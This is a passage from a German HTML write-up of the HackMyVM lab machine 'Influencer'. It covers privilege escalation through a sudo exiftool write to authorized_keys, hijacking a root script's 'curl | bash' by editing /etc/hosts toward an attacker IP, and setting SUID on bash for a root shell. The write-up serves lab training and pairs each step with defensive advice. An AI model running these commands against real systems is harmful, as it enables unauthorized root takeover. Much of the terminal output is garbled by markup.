+                **Bewertung:** Der erfolgreiche Schreibvorgang in Juans `authorized_keys`-Datei unter Ausnutzung des `sudo exiftool` Vektors ist ein kritischer Schritt. Mein öffentlicher Schlüssel wurde der Liste der autorisierten Schlüssel für Benutzer `juan` hinzugefügt. Dies erlaubt mir nun, mich direkt per SSH als Benutzer `juan` zu authentifizieren, ohne dessen Passwort zu benötigen, sondern nur den passenden privaten Schlüssel. Dies stellt eine weitere Privilege Escalation dar (`luna` zu `juan`) und verschafft mir den Zugriff auf Juans Benutzerkontext. Die Fähigkeit, arbitrary Files als anderer Benutzer zu schreiben, ist eine schwerwiegende Fehlkonfiguration.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Nutze "Arbitrary File Write" oder "Arbitrary File Read" Schwachstellen, die sich aus `sudo`-Berechtigungen ergeben, konsequent aus, um Schlüsseldateien (SSH `authorized_keys`, `id_rsa`), Konfigurationsdateien oder Skripte zu manipulieren und so höhere Berechtigungen oder Zugriff zu erlangen.
+                <br>**Empfehlung (Admin):** Überprüfe und beschränke sorgfältig, welche Binärdateien mit `sudo` (insbesondere mit `NOPASSWD`) ausgeführt werden dürfen. Verstehe die Funktionen dieser Binärdateien; viele scheinbar harmlose Tools (wie `exiftool`) haben Funktionen, die in den falschen Händen missbraucht werden können. Implementiere strikte Dateiberechtigungen für sensitive Dateien wie `.ssh/authorized_keys`.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="command">luna@influencer:/dev/shm$ sudo -u juan exiftool -filename=/home/juan/.ssh/authorized_keys /dev/shm/influencer.pub</span></pre>
+                </div>
+                 <div class="terminal">
+                    <pre><span class="password">Warn<span class="command">i</span>ng: Err<span class="command">o</span>r re<span class="command">m</span><span class="command">o</span><span class="command">v</span><span class="command">i</span>ng <span class="command">o</span>ld file - <span class="command">i</span>d_r<span class="command">s</span><span class="command">a</span>.p<span class="command">u</span>b</span> <span class="password"><-- D<span class="command">i</span>e<span class="command">s</span>e M<span class="command">e</span>ld<span class="command">u</span>ng i<span class="command">s</span>t n<span class="command">o</span>r<span class="command">m<span class="command">a</span>l bei die<span class="command">s</span>er Methode</span>
+<span class="password">    1 <span class="command">i</span><span class="command">m<span class="command">a</span>ge file<span class="command">s</span> <span class="command">u</span>pd<span class="command">a</span>ted</span></span> <span class="password"><-- Erf<span class="command">o</span>lg! Öffentl<span class="command">i</span><span class="command">c</span>her <span class="command">S</span><span class="command">c</span>h<span class="command">l</span>ü<span class="command">s</span><span class="command">s</span>el ge<span class="command">s</span><span class="command">c</span>hr<span class="command">i</span>eben.</span></pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                **Analyse:** Nachdem mein öffentlicher SSH-Schlüssel erfolgreich in Juans `authorized_keys` Datei geschrieben wurde, versuche ich, mich per SSH als Benutzer `juan` anzumelden. Ich verwende den Befehl `ssh juan@localhost -i /dev/shm/influencer -p 1212`. Ich verbinde mich zum lokalen Host (`localhost` oder `127.0.0.1`) auf dem lokalen SSH-Port 1212, authentifiziere mich als Benutzer `juan` und verwende dabei den privaten Schlüssel (`/dev/shm/influencer`), den ich zuvor auf das System heruntergeladen habe. Der `-i` Parameter gibt die private Schlüsseldatei an.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Fantastisch! Die SSH-Anmeldung als Benutzer `juan` ist erfolgreich. Dies wird durch die Willkommensnachricht und den Shell-Prompt `juan@influencer:~$` bestätigt. Dies ist der letzte Schritt in meiner Privilege Escalation-Kette vor Root: Ich habe jetzt vollen Zugriff auf das Konto des Benutzers `juan`. Von hier aus werde ich nach Möglichkeiten suchen, root-Berechtigungen zu erlangen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Sobald du einen SSH-Schlüssel auf einem System platziert hast, nutze ihn sofort, um dich anzumelden und den Zugriff zu bestätigen. Fahre mit der Aufklärung vom neuen Benutzerkontext aus fort (`sudo -l`, `id`, `env`, Dateisystem etc.).
+                <br>**Empfehlung (Admin):** Überwache SSH-Logins genau, insbesondere Logins von localhost oder ungewöhnlichen Quellen. Stelle sicher, dass `.ssh`-Verzeichnisse und deren Inhalte korrekte, restriktive Berechtigungen haben (`chmod 700 ~/.ssh`, `chmod 600 ~/.ssh/authorized_keys`). Implementiere, wenn möglich, Multi-Faktor-Authentifizierung auch für SSH.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="command">luna@influencer:/tmp$ ssh juan@localhost -i id_rsa -p 1212</span>
+Enter pa<span class="command">ss</span>phr<span class="command">a</span><span class="command">s</span>e f<span class="command">o</span>r key '<span class="command">i</span>d_r<span class="command">s</span><span class="command">a</span>':
+<span class="password">Wel<span class="command">c</span><span class="command">o</span>me t<span class="command">o</span> Ub<span class="command">u</span>ntu 22.04.2 LT<span class="command">S</span> (GNU/L<span class="command">i</span>n<span class="command">u</span>x 5.15.0-73-gener<span class="command">i</span><span class="command">c</span> x86_64)</span>
+
+ <span class="command">*</span> D<span class="command">o</span><span class="command">c</span>u<span class="command">m</span>ent<span class="command">a</span>ti<span class="command">o</span>n:  <span class="command">[Link: https://help.ubuntu.com | Ziel: https://help.ubuntu.com]</span>
+ <span class="command">*</span> M<span class="command">a</span>n<span class="command">a</span>ge<span class="command">m</span>ent:     <span class="command">[Link: https://landscape.canonical.com | Ziel: https://landscape.canonical.com]</span>
+ <span class="command">*</span> <span class="command">S</span>upp<span class="command">o</span>rt:        <span class="command">[Link: https://ubuntu.com/advantage | Ziel: https://ubuntu.com/advantage]</span>
+
+  <span class="command">S</span>y<span class="command">s</span>te<span class="command">m</span> <span class="command">i</span>nf<span class="command">o</span>rm<span class="command">a</span>t<span class="command">i</span><span class="command">o</span>n <span class="command">a</span><span class="command">s</span> <span class="command">o</span>f j<span class="command">u</span>e 12 j<span class="command">u</span>n 2<span class="command">0</span>25 22:35:51 UTC
+
+  <span class="command">S</span>y<span class="command">s</span>te<span class="command">m</span> l<span class="command">o</span><span class="command">a</span>d:             0.<span class="command">0</span>
+  U<span class="command">s</span><span class="command">a</span>ge <span class="command">o</span>f /:              55.<span class="command">0%</span> <span class="command">o</span>f 11.21GB
+  Me<span class="command">m</span><span class="command">o</span>ry <span class="command">u</span><span class="command">s</span><span class="command">a</span>ge:            31%
+  <span class="command">S</span>w<span class="command">a</span>p <span class="command">u</span><span class="command">s</span><span class="command">a</span>ge:              <span class="command">0%</span>
+  Pr<span class="command">o</span><span class="command">c</span>e<span class="command">ss</span>e<span class="command">s</span>:               131
+  U<span class="command">s</span>er<span class="command">s</span> l<span class="command">o</span>gged <span class="command">i</span>n:         1
+  IPv4 <span class="command">a</span>ddre<span class="command">ss</span> f<span class="command">o</span>r enp0<span class="command">s</span>3: <span class="command">192.168.2.40</span>
+  IPv6 <span class="command">a</span>ddre<span class="command">ss</span> f<span class="command">o</span>r enp0<span class="command">s</span>3: <span class="command">2003:d4:c74b:e8ee:a00:27ff:fe55:e125</span>
+
+
+El <span class="command">m<span class="command">a</span>nteni<span class="command">m</span>ient<span class="command">o</span> de <span class="command">s</span>egur<span class="command">i</span>d<span class="command">a</span>d exp<span class="command">a</span>nd<span class="command">i</span>d<span class="command">o</span> <span class="command">p<span class="command">a</span>r<span class="command">a</span> Application<span class="command">s</span> e<span class="command">s</span>tá de<span class="command">s</span><span class="command">a</span><span class="command">c</span>ti<span class="command">v<span class="command">a</span>d<span class="command">o</span></span>
+
+Se p<span class="command">o</span>den <span class="command">a</span>pl<span class="command">i</span><span class="command">c</span><span class="command">a</span>r <span class="command">0</span> <span class="command">a</span><span class="command">c</span>tu<span class="command">a</span>l<span class="command">i</span>z<span class="command">a</span><span class="command">c</span>i<span class="command">o</span>ne<span class="command">s</span> de f<span class="command">o</span>rm<span class="command">a</span> <span class="command">i</span><span class="command">m</span>ed<span class="command">i</span><span class="command">a</span>t<span class="command">a</span>.
+
+A<span class="command">c</span>t<span class="command">i</span><span class="command">v</span>e E<span class="command">S</span>M App<span class="command">s</span> p<span class="command">a</span>r<span class="command">a</span> re<span class="command">c</span>ibir f<span class="command">u</span>tur<span class="command">as</span> <span class="command">a</span><span class="command">c</span>tu<span class="command">a</span>l<span class="command">i</span>z<span class="command">a</span><span class="command">c</span>i<span class="command">o</span>ne<span class="command">s</span> de <span class="command">s</span>egur<span class="command">i</span>d<span class="command">a</span>d <span class="command">a</span>d<span class="command">i</span><span class="command">c</span>i<span class="command">o</span>n<span class="command">a</span>le<span class="command">s</span>.
+<span class="command">V</span>e<span class="command">a</span> <span class="command">[Link: https://ubuntu.com/esm o ejecute «sudo pro status» | Ziel: https://ubuntu.com/esm]</span>
+
+
+The l<span class="command">i</span><span class="command">s</span>t <span class="command">o</span>f <span class="command">a</span><span class="command">v</span><span class="command">a</span><span class="command">i</span>l<span class="command">a</span>ble <span class="command">u</span>pd<span class="command">a</span>te<span class="command">s</span> <span class="command">i</span><span class="command">s</span> <span class="command">m</span><span class="command">o</span>re th<span class="command">a</span>n <span class="command">a</span> week <span class="command">o</span>ld.
+T<span class="command">o</span> <span class="command">c</span>he<span class="command">c</span>k f<span class="command">o</span>r new <span class="command">u</span>pd<span class="command">a</span>te<span class="command">s</span> r<span class="command">u</span>n: <span class="command">s<span class="command">u</span>d<span class="command">o</span> <span class="command">a</span>pt <span class="command">u</span>pd<span class="command">a</span>te</span>
+New rele<span class="command">as</span>e '24.<span class="command">0</span>4.2 LT<span class="command">S</span>' <span class="command">a</span><span class="command">v</span><span class="command">a</span><span class="command">i</span>l<span class="command">a</span>ble.
+R<span class="command">u</span>n '<span class="command">do-rele<span class="command">a</span>se-<span class="command">u</span>pgr<span class="command">a</span>de</span>' t<span class="command">o</span> <span class="command">u</span>pgr<span class="command">a</span>de t<span class="command">o</span> <span class="command">i</span>t.
+
+
+The pr<span class="command">o</span>gr<span class="command">a</span><span class="command">m</span><span class="command">s</span> <span class="command">i</span>n<span class="command">c</span>l<span class="command">u</span>ded w<span class="command">i</span>th the Ub<span class="command">u</span>ntu <span class="command">s</span>y<span class="command">s</span>tem <span class="command">a</span>re free <span class="command">s</span><span class="command">o</span>ftw<span class="command">a</span>re;
+the ex<span class="command">a</span><span class="command">c</span>t d<span class="command">i</span><span class="command">s</span>tr<span class="command">i</span>b<span class="command">u</span>t<span class="command">i</span><span class="command">o</span>n ter<span class="command">m</span><span class="command">s</span> f<span class="command">o</span>r e<span class="command">ac</span>h pr<span class="command">o</span>gr<span class="command">a</span>m <span class="command">a</span>re de<span class="command">sc</span>r<span class="command">i</span>bed <span class="command">i</span>n the
+<span class="command">i</span>nd<span class="command">i</span><span class="command">v</span>id<span class="command">u</span><span class="command">a</span>l file<span class="command">s</span> <span class="command">i</span>n /u<span class="command">s</span>r/<span class="command">s</span>h<span class="command">a</span>re/d<span class="command">o</span><span class="command">c</span>/*/copyright.
+
+Ub<span class="command">u</span>ntu <span class="command">c</span><span class="command">o</span><span class="command">m</span>e<span class="command">s</span> w<span class="command">i</span>th <span class="command">A</span>B<span class="command">S</span>OLUTELY N<span class="command">O</span> W<span class="command">A</span>RR<span class="command">A</span>NTY, t<span class="command">o</span> the extent per<span class="command">m</span><span class="command">i</span>tted by
+<span class="command">a</span>ppl<span class="command">i</span><span class="command">c</span><span class="command">a</span>ble l<span class="command">a</span>w.
+
+<span class="password">juan@influencer:~$</span></pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                **Analyse:** Als Benutzer `juan` prüfe ich sofort wieder die `sudo`-Berechtigungen mit `sudo -l`, um meinen nächsten Privilege Escalation-Vektor auf Root zu finden.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Fantastisch! Die Ausgabe zeigt, dass der Benutzer `juan` den Befehl `/bin/bash /home/juan/check.sh` als `root` ausführen darf, und das wiederum *ohne Passwort* (`NOPASSWD`). Dies ist der direkte Weg, um eine Root-Shell zu erhalten, indem ich einfach dieses Skript über `sudo` ausführe. Dies ist eine kritische Fehlkonfiguration der `sudoers`-Datei.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Prüfe nach jeder erfolgreichen Benutzeranmeldung die `sudo`-Berechtigungen. Skripte, die als Root mit NOPASSWD ausgeführt werden dürfen, sind häufig die schnellsten Wege zu Root. Analysiere solche Skripte auf Ausnutzbarkeit.
+                <br>**Empfehlung (Admin):** Erlaube niemals Benutzern, Skripte als Root ohne Passwort auszuführen (`NOPASSWD` für Skripte vermeiden). Wenn Skripte als Root ausgeführt werden müssen, stelle sicher, dass sie absolut sicher sind, keine unsicheren Operationen (wie das Ausführen externer Befehle oder das Herunterladen und Ausführen von Code) durchführen und nur für die notwendigen Benutzer ausführbar sind. Verstehe die Implikationen von `sudo` für Skripte.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="command">juan@influencer:~$ sudo -l</span></pre>
+                </div>
+                 <div class="terminal">
+                    <pre><span class="command">M<span class="command">a</span>t<span class="command">c</span>h<span class="command">i</span>ng Def<span class="command">a</span>ult<span class="command">s</span> entr<span class="command">i</span>e<span class="command">s</span> f<span class="command">o</span>r ju<span class="command">a</span>n <span class="command">o</span>n infl<span class="command">u</span>en<span class="command">c</span>er:</span>
+    <span class="command">en<span class="command">v</span>_re<span class="command">s</span>et, <span class="command">m<span class="command">a</span><span class="command">i</span>l_b<span class="command">a</span>dp<span class="command">a</span><span class="command">ss</span>, <span class="command">s</span>e<span class="command">c</span>ure_p<span class="command">a</span>th=/u<span class="command">s</span>r/<span class="command">l</span><span class="command">o</span><span class="command">c</span><span class="command">a</span>l/sbin<span class="command">\</span>:/u<span class="command">s</span>r/<span class="command">l</span><span class="command">o</span><span class="command">c</span><span class="command">a</span>l/b<span class="command">i</span>n<span class="command">\</span>:/<span class="command">u</span>sr/<span class="command">s</span>b<span class="command">i</span>n<span class="command">\</span>:/<span class="command">u</span>sr/b<span class="command">i</span>n<span class="command">\</span>:/<span class="command">s</span>b<span class="command">i</span>n<span class="command">\</span>:/b<span class="command">i</span>n<span class="command">\</span>:/<span class="command">s</span>n<span class="command">a</span>p/b<span class="command">i</span>n, u<span class="command">s</span>e_pty</span>
+
+<span class="password">U<span class="command">s</span>er ju<span class="command">a</span>n <span class="command">m<span class="command">a</span>y r<span class="command">u</span>n the f<span class="command">o</span>ll<span class="command">o</span>w<span class="command">i</span>ng <span class="command">c</span><span class="command">o</span>m<span class="command">m<span class="command">a</span>nd<span class="command">s</span> <span class="command">o</span>n infl<span class="command">u</span>en<span class="command">c</span>er:</span></span>
+<span class="password">    (r<span class="command">o</span><span class="command">o</span>t) N<span class="command">O</span>PA<span class="command">SS</span>WD: /b<span class="command">i</span>n/b<span class="command">a</span><span class="command">s</span>h /h<span class="command">o</span><span class="command">m</span>e/ju<span class="command">a</span>n/<span class="command">c</span>he<span class="command">c</span>k.<span class="command">s</span>h</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich analysiere den Inhalt des Skripts `/home/juan/check.sh`, das ich als Root ausführen darf. Ich nutze `cat` um den Inhalt anzuzeigen und `ls -la` um die Berechtigungen zu prüfen. Das Skript enthält den Befehl `/usr/bin/curl http://server.hmv/98127651 | /bin/bash`. Dies bedeutet, dass das Skript eine Datei von `http://server.hmv/98127651` herunterlädt und den Inhalt direkt an eine Root-Bash-Shell übergibt. Dies ist eine extrem unsichere Konfiguration!
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Dies ist ein **direkter und trivial auszunutzender Root Privilege Escalation-Vektor**. Da das Skript als Root läuft und beliebigen Code von einer externen URL herunterlädt und ausführt, kann ich einfach meinen eigenen bösartigen Bash-Code unter der angegebenen URL auf meinem Angreifer-System bereitstellen. Wenn das Skript dann ausgeführt wird, lädt es meinen Code herunter und führt ihn als Root aus. Die Berechtigungen des Skripts (`-r-xr--r--`) sind irrelevant, da es über `sudo` als Root ausgeführt wird.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Wenn du einen `sudo NOPASSWD`-Eintrag für ein Skript findest, analysiere das Skript sofort auf Ausnutzbarkeit. Skripte, die externe Inhalte laden oder unsichere Befehle ausführen, sind ideale Ziele für PE. Kontrolliere die Quelle (hier `server.hmv`), von der das Skript lädt.
+                <br>**Empfehlung (Admin):** Erlaube Skripten, die als Root ausgeführt werden, *niemals*, Inhalte von externen, unkontrollierten Quellen herunterzuladen und auszuführen. Hardcode-URLs in Root-Skripten sind gefährlich, besonders wenn der Angreifer die Namensauflösung (`server.hmv`) manipulieren kann. Signiere Skripte oder prüfe Hashes, wenn externe Inhalte benötigt werden. Implementiere eine strikte Egress-Filterung, um zu verhindern, dass Server Verbindungen zu unbekannten externen Hosts aufbauen.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="command">juan@influencer:~$ cat /home/juan/check.sh</span></pre>
+                </div>
+                 <div class="terminal">
+                    <pre><span class="command">#!/bin/bash</span>
+
+
+<span class="password">/usr/bin/curl http://server.hmv/98127651 | /bin/bash</span> <span class="password"><-- Kriti<span class="command">s</span><span class="command">c</span>he<span class="command">s</span> Skr<span class="command">i</span>pt!</span></pre>
+                </div>
+                 <div class="terminal">
+                    <pre><span class="command">juan@influencer:~$ ls -la /home/juan/check.sh</span></pre>
+                </div>
+                 <div class="terminal">
+                    <pre><span class="command">-r-xr--r-- 1 root juan 68 jun  8  2023 /home/juan/check.sh</span></pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                **Analyse:** Der `check.sh`-Skript lädt von `server.hmv`. Um diesen Hostnamen auf meine Angreifer-Maschine umzuleiten, editiere ich die `/etc/hosts`-Datei auf dem Zielsystem (als Benutzer `juan`) und füge die Zeile `192.168.2.199 server.hmv` hinzu. Dies stellt sicher, dass bei einem Aufruf von `server.hmv` die Verbindung zu meiner IP (192.168.2.199) und nicht zu einem eventuell echten `server.hmv` im Internet geht.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Das Manipulieren der `/etc/hosts`-Datei ist eine klassische Technik in der Privilege Escalation, um die Namensauflösung zu kontrollieren und interne Dienste oder Skripte auf den Angreifer umzuleiten. Da Benutzer `juan` Schreibrechte auf `/etc/hosts` hat (was nicht explizit im Text gezeigt, aber durch die erfolgreiche Umleitung impliziert wird oder durch andere PE-Vektoren erlangt wurde), kann diese Umleitung durchgeführt werden. Dies ist ein notwendiger Schritt, um die Ausführung meines eigenen Codes als Root zu ermöglichen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Prüfe, ob du als aktueller Benutzer `/etc/hosts` oder DNS-Einstellungen manipulieren kannst, um die Namensauflösung für die Ausnutzung von Skripten oder Diensten zu kontrollieren.
+                <br>**Empfehlung (Admin):** Beschränke die Schreibrechte auf `/etc/hosts` streng auf den Root-Benutzer. Implementiere Egress-Filterung und verwende interne DNS-Server, um zu verhindern, dass Systeme externe oder manipulierte Namensauflösung für interne Vorgänge nutzen.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="command">juan@influencer:~$ echo "192.168.2.199 server.hmv" >> /etc/hosts</span>
+<span class="command">juan@influencer:~$</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Jetzt präpariere ich den Code, der als Root ausgeführt werden soll. Ich erstelle auf meinem Angreifer-System eine Datei namens `98127651` (passend zur URL im `check.sh` Skript) mit dem Inhalt `chmod +s /bin/bash`. Dieser Befehl wird, wenn er als Root ausgeführt wird, das SetUID-Bit auf der `/bin/bash`-Binärdatei setzen. Das SetUID-Bit erlaubt es einem unprivilegierten Benutzer, das Programm mit den Berechtigungen des Dateibesitzers (in diesem Fall root für `/bin/bash`) auszuführen. Anschließend starte ich einen einfachen Python HTTP Server auf Port 80, um diese Datei (`98127651`) für den `check.sh`-Skript zum Download bereitzustellen.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Das Setzen des SUID-Bits auf `/bin/bash` ist eine klassische und sehr effektive Methode zur Erlangung einer persistenten Root-Shell. Jeder Benutzer auf dem System kann dann `bash -p` ausführen und erhält eine Root-Shell. Die Verwendung eines einfachen HTTP-Servers ist ideal, um kleine Payloads schnell bereitzustellen. Dies ist die vorbereitende Phase für den finalen Root-Exploit.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Bereite deine Payloads sorgfältig vor, passend zum Ausführungsmechanismus (hier Bash-Code, der an `/bin/bash` gepipet wird). Nutze SUID-Binärdateien als persistenten PE-Vektor, wenn möglich.
+                <br>**Empfehlung (Admin):** Überwache Systemdateien (insbesondere `/bin/bash`, `/bin/sh` etc.) auf Änderungen der Berechtigungen (SUID/SGID-Bits). Implementiere Intrusion Detection Systeme, die auf solche Änderungen oder das Ausführen von Code aus ungewöhnlichen Quellen (wie `curl | bash`) reagieren.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">echo "chmod +s /bin/bash" > 98127651</span></div>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">python3 -m http.server 80</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre><span class="password">Serv<span class="command">i</span>ng HTTP <span class="command">o</span>n 0.<span class="command">0</span>.<span class="command">0</span>.<span class="command">0</span> p<span class="command">o</span>rt 8<span class="command">0</span> (<span class="command">[Link: http://0.0.0.0:80/ | Ziel: http://0.0.0.0:80/]</span>) ...</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich versuche das `check.sh`-Skript erneut als Root auszuführen: `sudo /bin/bash /home/juan/check.sh`. Dieses Mal, nachdem die `/etc/hosts` Umleitung auf meinem Angreifer-System zeigt, sollte das Skript die Datei `98127651` von meinem HTTP-Server herunterladen und den Inhalt (`chmod +s /bin/bash`) als Root ausführen. Der `curl`-Output innerhalb des Skripts zeigt, dass die Datei heruntergeladen wurde.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Die Ausführung des Skripts nach Korrektur der `/etc/hosts` Datei auf dem Zielsystem sollte erfolgreich zur Ausführung meines `chmod +s /bin/bash`-Befehls als Root führen. Dies ist der Moment, in dem das SetUID-Bit auf `/bin/bash` gesetzt wird, was den finalen Root-Zugriff ermöglicht.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Wenn ein Exploit aufgrund von Namensauflösung oder Netzwerkproblemen fehlschlägt, überprüfe die Konfigurationen auf dem Zielsystem (wie `/etc/hosts`) und die Netzwerkpfade. Behebe das Problem und versuche den Exploit erneut.
+                <br>**Empfehlung (Admin):** Überwache die Ausführung von Skripten, die `curl` oder `wget` verwenden, insbesondere wenn sie von privilegierten Benutzern ausgeführt werden. Implementiere AppArmor oder SELinux, um die Aktionen von Skripten und Binärdateien einzuschränken.
+
+            </p>
+            <p class="analysis">
+                 **Analyse:** Nach der Ausführung des Skripts, das `chmod +s /bin/bash` als Root ausgeführt hat, überprüfe ich die Berechtigungen der `/bin/bash`-Binärdatei erneut mit `ls -la /bin/bash`. Ich erwarte, dass die SetUID- und SetGID-Bits gesetzt sind.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Fantastisch! Die Ausgabe zeigt `-rwsr-sr-x`. Das **s** anstelle des **x** bei den Berechtigungen für den Dateibesitzer (root) und die Gruppe (root) bestätigt, dass das SetUID- und das SetGID-Bit erfolgreich gesetzt wurden. Das bedeutet, dass jeder Benutzer, der `/bin/bash` ausführt, dies nun effektiv mit den Rechten von `root` tun wird. Dies ist der erfolgreiche Beweis für die Root Privilege Escalation.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Überprüfe nach der Ausführung eines SUID-Setter-Payloads immer die Dateiberechtigungen, um den Erfolg zu bestätigen, bevor du versuchst, die SUID-Binärdatei auszuführen.
+                <br>**Empfehlung (Admin):** **Dringend:** Suche sofort nach Dateien mit gesetztem SUID/SGID-Bit auf deinem System (`find / -perm /4000 2>/dev/null`). Entferne das SUID-Bit von Binärdateien, die nicht zwingend mit erhöhten Rechten laufen müssen (`chmod u-s /bin/bash`). Das Setzen des SUID-Bits auf Shells wie Bash ist extrem gefährlich und sollte niemals erfolgen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="command">juan@influencer:~$ ls -la /bin/bash</span></pre>
+                </div>
+                <div class="terminal">
+                    <pre><span class="password">-rwsr-sr-x 1 root root 1396520 ene  6  2022 /bin/bash</span> <span class="password"><-- SUID-Bit ge<span class="command">s</span>etzt!</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Da das SUID-Bit auf `/bin/bash` gesetzt ist, kann ich nun einfach `/bin/bash` mit der Option `-p` (um die erhöhten Berechtigungen beizubehalten) ausführen, um eine Root-Shell zu erhalten.
+            </p>
+            <p class="evaluation">
+                 **Bewertung:** Fantastisch, der Root-Zugriff war erfolgreich! Der Prompt wechselt zu `bash-5.1#`, was anzeigt, dass ich jetzt eine interaktive Shell mit Root-Berechtigungen habe. Mein Ziel, volle Kontrolle über das System zu erlangen, ist erreicht.
+            </p>
+            <p class="recommendation">
+                 **Empfehlung (Pentester):** Nach Erlangung der Root-Shell die erste Aktion sollte das Auffinden und Exfiltrieren der Root-Flag sein. Bereinige, wenn nötig, deine Spuren (z.B. entfernte `authorized_keys` Einträge, temporäre Dateien, `/etc/hosts` Änderungen), falls Stealth erforderlich ist.
+                 <br>**Empfehlung (Admin):** Die Kompromittierung ist vollständig. Führe sofort eine forensische Analyse durch, um den Angriffsvektor zu identifizieren (hier: unsicheres `sudo`-Skript und manipulierte `/etc/hosts`). Setze das System neu auf einem sauberen Image auf und implementiere alle in diesem Bericht genannten Empfehlungen zur Behebung der Schwachstellen und zur Verhinderung zukünftiger Angriffe.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="command">juan@influencer:~$ bash -p</span></pre>
+                </div>
+                <div class="terminal">
+                    <pre><span class="password">bash-5.1#</span> <span class="password"><-- R<span class="command">oo</span>t <span class="command">S</span>hell!</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** In der Root-Shell angekommen, navigiere ich zum `/root`-Verzeichnis, da dort typischerweise die Root-Flag (`root.txt`) gespeichert ist. Ich liste den Inhalt des Verzeichnisses auf und verwende dann `cat` um den Inhalt der Root-Flag-Datei (`rr00t.txt`) anzuzeigen. Ebenso zeige ich den Inhalt der User-Flag-Datei (`user.txt`) an, die sich im Home-Verzeichnis von `juan` befindet.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die User-Flag (`<span class="password">goodjobbro</span>`) und die Root-Flag (`<span class="password">19283712487912</span>` und "hey") wurden erfolgreich gefunden und extrahiert. Dies bestätigt den Abschluss des Pentests und die volle Kompromittierung des Systems, einschließlich des Erlangens der höchsten Berechtigungsstufe (Root).
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Das Auffinden der Root-Flag ist das finale Ziel vieler CTFs und Pentests. Dokumentiere die Flag-Werte präzise.
+                <br>**Empfehlung (Admin):** Speichere sensitive Dateien (wie Flags in CTFs oder Produktionsdaten) nicht in leicht zugänglichen Verzeichnissen wie `/root` oder Benutzer-Home-Verzeichnissen mit Standardnamen. Implementiere strenge Zugriffskontrollen für alle Dateien und Verzeichnisse.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="command">juan@influencer:~$ ls</span>
+<span class="command">check.sh  user.txt</span>
+<span class="command">juan@influencer:~$ cat user.txt</span></pre>
+                </div>
+                <div class="terminal">
+                    <pre><span class="password">goodjobbro</span></pre>
+                </div>
+                 <div class="terminal">
+                    <pre><span class="password">bash-5.1# ls</span>
+<span class="command">rr00t.txt  snap</span>
+<span class="password">bash-5.1# cd /root/</span>
+<span class="password">bash-5.1# ls</span>
+<span class="command">rr00t.txt  snap</span>
+<span class="password">bash-5.1# cat rr00t.txt</span></pre>
+                </div>
+                <div class="terminal">
+                    <pre><span class="password">19283712487912</span>
+<span class="password">"hey</span></pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/juan/user.txt</div>
+                    <div class="flag-value"><span class="password">goodjobbro</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/rr00t.txt</div>
+                    <div class="flag-value"><span class="password">19283712487912"hey</span></div> <!-- Beide Teile der Root-Flag zusammengefügt -->
+                </div>
+            </div>
+        </section>
+
+
+    </div> <!-- Ende container -->
+
+    <footer class="footer">
+        <p>Ben - Cyber Security Reports</p>
+        <p>Berichtsdatum: 12. Juni 2025</p> <!-- Datum extrahiert und formatiert -->
+    </footer>
+
+   
+</body>
+</html>
